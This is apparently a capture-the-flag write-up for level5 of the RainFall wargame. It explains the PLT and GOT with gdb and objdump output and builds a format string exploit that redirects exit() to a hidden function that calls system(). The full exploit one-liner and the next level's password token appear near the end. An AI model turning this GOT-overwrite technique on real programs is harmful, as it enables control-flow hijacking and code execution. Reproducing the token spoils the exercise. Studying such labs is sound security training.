## level5
In `level5` we will be __Overwriting the Global Offset Table__. <br> Within this executable we have three functions `main(), n()` and `o()` that's is never called and
not visible to us until we use:
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
[...]
```
One important thing to note here is that the function `n()` will not return like all the functions so far has done, at the end of the function, instead of using
a `ret` the function will call <br> `0x080484ff <+61>:	call   0x80483d0 <exit@plt>` <br> and that `exit()` call will make our `format string exploit` a little
bit different, and for that we will be checking the `GOT`. <br>
Since a program could use a function in a shared library many times, it's useful to have a table to reference all the functions. Another special section in compiled
programs is used for this purpose - the *procedure linkage table* (PLT).<br> This section consists of many jump instructions, each one corresponding to the address
of a function. It works like a springboard - time a shared function needs to be called, controll will pass through the PLT.
```
~$ objdump -d -j .plt ./level5

./level5:     file format elf32-i386


Disassembly of section .plt:

08048370 <printf@plt-0x10>:
 8048370:	ff 35 1c 98 04 08    	pushl  0x804981c
 8048376:	ff 25 20 98 04 08    	jmp    *0x8049820
 804837c:	00 00                	add    %al,(%eax)
	...

08048380 <printf@plt>:
 8048380:	ff 25 24 98 04 08    	jmp    *0x8049824
 8048386:	68 00 00 00 00       	push   $0x0
 804838b:	e9 e0 ff ff ff       	jmp    8048370 <_init+0x3c>

08048390 <_exit@plt>:
 8048390:	ff 25 28 98 04 08    	jmp    *0x8049828
 8048396:	68 08 00 00 00       	push   $0x8
 804839b:	e9 d0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483a0 <fgets@plt>:
 80483a0:	ff 25 2c 98 04 08    	jmp    *0x804982c
 80483a6:	68 10 00 00 00       	push   $0x10
 80483ab:	e9 c0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483b0 <system@plt>:
 80483b0:	ff 25 30 98 04 08    	jmp    *0x8049830
 80483b6:	68 18 00 00 00       	push   $0x18
 80483bb:	e9 b0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483c0 <__gmon_start__@plt>:
 80483c0:	ff 25 34 98 04 08    	jmp    *0x8049834
 80483c6:	68 20 00 00 00       	push   $0x20
 80483cb:	e9 a0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>

080483e0 <__libc_start_main@plt>:
 80483e0:	ff 25 3c 98 04 08    	jmp    *0x804983c
 80483e6:	68 30 00 00 00       	push   $0x30
 80483eb:	e9 80 ff ff ff       	jmp    8048370 <_init+0x3c>
```
One of these jump instructions is associated with the `exit()` function, which is called at the end of the `n()` function to exit the prgram. If the `jmp` 
instruction used for the `exit()` function can be manipulated to direct the execution flow int `o()` function we can get it to execute the `system()` function.
The problem here is that the *procedure linking table* is read only:
```diff
level5@RainFall:~$ objdump -h level5 | grep -A1 "\ .plt\ "
 11 .plt         00000080  08048370  08048370  00000370  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
```
But closer examination of the `jmp` instructions reveals that they aren't jumping to __addresses__ but to pointers to addresses. For example the `exit()` function is stored as a pointer at the memory __address__ `0x8049838`. <br> These __addresses__ exist in another section, called the __*global offset table (GOT)*__ which is writable. These __addresses__ can be directly obtained by displaying the dynamic relocation entries for the binary bu using `objdump`
```
~$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
|address | fucntion|
|--------|---------|
|0x08049838|`exit()`|
|0x080484a4| `o()`|

If we pay attention above we can see that only the two right most bytes are differents, so what we need to do is change those two bytes. <br>
From the `printf()` main page we know that: *An optional length modifier, that specifies the size of the argument.* Here we will be using `%h` that represents a *short* or a *half-word*

if we convert those two bytes from hex to decimal with the help of [hex-to-int](https://www.rapidtables.com/convert/number/hex-to-decimal.html) we get `0x84a4 = 33956`.<br> So lets get the **offset** as before
```
~$ echo "AAAA %x %x %x %x %x" | ./level5
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
```
So here we see can our __offset__ is again at position 4th and with the `%h` for the *short* it will be `%4\$hn` so far we have all we need to create our *format string exploit:* <br>
`(python -c "print('\x38\x98\x04\x08' + '%33952d%4\$hn')"; cat -) | ./level5` <br>
Now all we need to do is get the token:
```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
